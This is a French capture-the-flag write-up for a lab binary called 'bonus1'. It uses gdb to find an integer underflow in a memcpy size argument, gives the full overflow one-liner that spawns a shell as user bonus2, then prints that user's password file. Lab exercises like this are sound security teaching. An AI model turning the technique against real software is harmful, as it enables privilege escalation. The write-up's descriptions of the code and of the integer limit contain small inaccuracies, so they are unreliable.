#  Shell Code Exploitation

En décompilant l'exécutable, on remarque que le programme doit passer 2 check pour executer un shell avec les droits de bonus2.

La première condition, est que notre premier argument doit-être inférieur à 10. 

```C
arg1 = atoi(argv[1]);
if (arg1 < 10) 
```
Notre deuxième condition est que notre premier argument soit égal à `0x574f4c46`soit `1464814662`en base 10.

```C
if (argv[1] == 0x574f4c46)
	execl("/bin/sh");
```

Entre ces deux conditions, il y a un `memcpy`, que nous allons utiliser afin de faire notre exploit. 

```C
memcpy(buffer, argv[2], (len(argv[1]) * 4));
```

En effet; le troisième argument de `memcpy` est un `size_t`. Le fait que cela soit un size_t va nous être très utile, puisque qu'il n'y a pas de nombre négatif avec les size_t, nous allons donc pouvoir faire un `underflow`

Il va donc falloir qu'on change la valeur de notre premier argument afin qu'elle coincide avec `0x574f4c46`.

Il s'avère qu'on a la possibilité de passer des nombres négatifs comme premier argument. En prenant un nombre très petit, on peut faire un `underflow`. Voyons tout ça dans `gdb`

```
> gdb ./bonus1
(gdb) disass main 
[...]
   0x08048470 <+76>:	mov    %eax,(%esp)
   0x08048473 <+79>:	call   0x8048320 <memcpy@plt>
   0x08048478 <+84>:	cmpl   $0x574f4c46,0x3c(%esp)
```
On voit un call a `memcpy`, on va donc break juste après, sur la comparaison  et lancer le programme avec différentes valeurs.
```
(gdb) break *0x08048478
[...]
(gdb) r 8 A
[...]
(gdb) x/50wx $esp
[...]
0xbffff6b0:	0xbffff6c4	0xbffff8e3	0x00000020	0x080482fd
0xbffff6c0:	0xb7fd13e4	0x41414141	0x45485300	0x2f3d4c4c
0xbffff6d0:	0x2f6e6962	0x68736162	0x52455400	0x74783d4d
```
On voit `0x00000020`, ce qui donne 32 en decimal. Ce qui correspond donc à notre premier argument après memcpy. La multiplication par 4 dans le `memcpy` fonctionne donc bien.
Notre début de buffer est donc à l'adresse `0xbffff6c4`.

On peut vérifier cela avec gdb
```
(gdb) break *0x08048478
[...]
(gdb) set args 2 AAAA
(gdb) x 0xbffff6c4
[...]
0xbffff6c4:	0x41414141
```
On retrouve bien nos A dans le buffer.
On peut également afficher le registre de comparaison, vu précédement `0x3c(%esp)`.

```
(gdb) x $esp+0x3c
[...]
0xbffff6ec:	0x00000002
```

Nous avons également testé avec la valeur de `int min : -2147483647`
```
(gdb) break *0x08048473
[...]
(gdb) r -2147483647 AAAAAAAAAAAAAAAAAAAA
[...]
(gdb) x/50wx $esp
[...]
0xbffff690:	0xbffff6a4	0xbffff8d4	0x00000004	0x080482fd
```

Le résultat n'était pas convaincant. Nous avons donc ajouté la taille du `buffer` à notre `intmin`.
```
-2147483647 + 40 = -2147483607
```

```
(gdb) break *0x08048473
[...]
(gdb) r -2147483607 AAAAAAAAAAAAAAAAAAAA
[...]
(gdb) x/50wx $esp
[...]
0xbffff690:	0xbffff6a4	0xbffff8d3	0x000000a4	0x080482fd
```
On obtient maintenant `0x000000a4`. En decimal, cela équivaut à 164.
On peut donc lancer notre programme avec `-2147483607` en premier argument, et remplir notre buffer avec la valeur de comparaison * 164.

La valeur de comparaison est`0x574f4c46`.
 Cette adresse en little indian est donc `\x46\x4c\x4f\x57`.
 
On peut donc faire 
```
./bonus1 -2147483607 `python -c 'print "\x46\x4c\x4f\x57"*164'`
[...]
$whoami
[...]
bonus2
$ cat /home/user/bonus2/.pass
[...]
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```